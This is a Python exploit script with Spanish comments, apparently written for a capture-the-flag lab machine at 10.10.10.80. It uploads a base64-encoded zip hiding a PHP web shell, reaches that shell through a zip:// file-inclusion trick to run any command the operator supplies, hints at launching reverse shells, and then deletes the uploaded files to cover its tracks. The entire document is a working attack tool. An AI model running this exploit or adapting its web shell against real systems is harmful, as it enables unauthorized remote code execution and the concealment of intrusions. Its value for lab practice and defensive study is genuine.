#!/usr/bin/python3

import signal, argparse, time, sys
import requests
import base64
from bs4 import BeautifulSoup

# -- Variables globales
URL = "http://10.10.10.80/"
session = requests.Session()

# -- Clases
# Colores
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# -- Funciones
# CTRL+C
def def_handler(sig, frame):
    print("\ns4lí...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Definimos los argumentos que recibe el programa
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument('-i', dest="lhost", type=str, help="IP donde están siendo subidos los archivos: (uploads/esta_ip)")
    parse.add_argument('-c', dest="command", type=str, default="id", help="Comando a ejecutar en el sistema (default: id)")
    args = parse.parse_args()

    if not args.lhost:
        print("\n[+] Ejemplo: %s -i 10.10.123.123 -c id\n" % (sys.argv[0]))
        exit(1)

    return args

# Subimos el contenido del objeto .zip
def upload_zip_content():
    print("[+] Enviando contenido del objeto " + Color.WHITE + ".zip" + Color.END + " en el campo " + Color.WHITE + "tip" + Color.END + " de la petición.")

    r = session.get(URL, params={"op":"upload"})
    soup = BeautifulSoup(r.content, "html.parser")

    token_value = soup.find(attrs={"name": "token"})["value"]

    zip_file_b64 = "UEsDBAoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABwAaG9sYS5waHBVVAkAA09dCWFPXQlhdXgLAAEE6AMAAAToAwAAPD9waHAgc3lzdGVtKCRfR0VUWyd4bWQnXSk7ID8+ClBLAQIeAwoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABgAAAAAAAEAAACkgQAAAABob2xhLnBocFVUBQADT10JYXV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAABhAAAAAAA="
    zip_file_bytes = zip_file_b64.encode('utf-8')
    zip_file = base64.decodebytes(zip_file_bytes)

    data_post = {
        "tip": zip_file,
        "name": "hola",
        "token": token_value,
        "submit": "Send Tip!"
    }
    r = session.post(URL, params={"op":"upload"}, data=data_post)
    # Extraemos el hash (el nombre) del archivo, esto de la URL a la que nos redirecciona.
    secretname = r.url.split('=')[2]

    print("[+] Archivo .zip creado, leyendo el objeto " + Color.WHITE + ".php" + Color.END + ".")
    time.sleep(1)

    return secretname

# Ejecutamos comandos en el sistema
def exe_commands(secretname, lhost, command):
    data_get = {
        "op": "zip://uploads/%s/%s#hola" % (lhost, secretname),
        "xmd": command
    }
    # Si la peticion se demora más de 3 segundos podemos intuir que se intento generar una Reverse Shell, entonces cerramos la petición y evitamos que el programa se quede pegado
    try:
        r = session.get(URL, params=data_get, timeout=3)

        # En caso de no encontrar la IP
        if "no such page" in r.text:
            print(Color.RED + "[-] Valida tu IP ya que la web no encuentra tu folder de archivos." + Color.END)
            exit(1)

    except requests.exceptions.Timeout:
        print("[+] Ejecutando Reverse Shell, espera...")

        # Borramos archivos del sistema
        exe_commands(secretname, lhost, "rm -r uploads/%s" % (lhost))

        print("[+] Hecho (:")
        exit(0)

    all_response = r.text

    # Sabemos que la respuesta del comando ejecutado esta entre el tag </nav> .... <footer>, así que buscamos sus posiciones y extraemos lo que este entre ellos
    pos_end_nav_html = all_response.find("</nav>") + 7  #Nos movemos 7 posiciones para evitar que se muestre </nav>
    pos_start_footer_html = all_response.find("<footer>")

    res_command = all_response[pos_end_nav_html:pos_start_footer_html].strip()

    if not res_command:  # Sabemos que llego vacia la respuesta y evitamos que nos muestre una linea sin nada
        pass
    else:
        # Imprimimos el resultado del comando ejecutado
        print(Color.GREEN + "\n" + res_command + "\n" + Color.END)

# Controlamos el flujo completo del programa
def main():
    args = arguments()

    # Subimos contenido del .zip
    secretname = upload_zip_content()

    print("[+] Ejecutando el comando " + Color.WHITE + args.command + Color.END +" en el sistema.")
    time.sleep(1)
    exe_commands(secretname, args.lhost, args.command)

    # Borramos los archivos subidos del sistema
    exe_commands(secretname, args.lhost, "rm -r uploads/%s" % (args.lhost))

if __name__ == '__main__':
    main()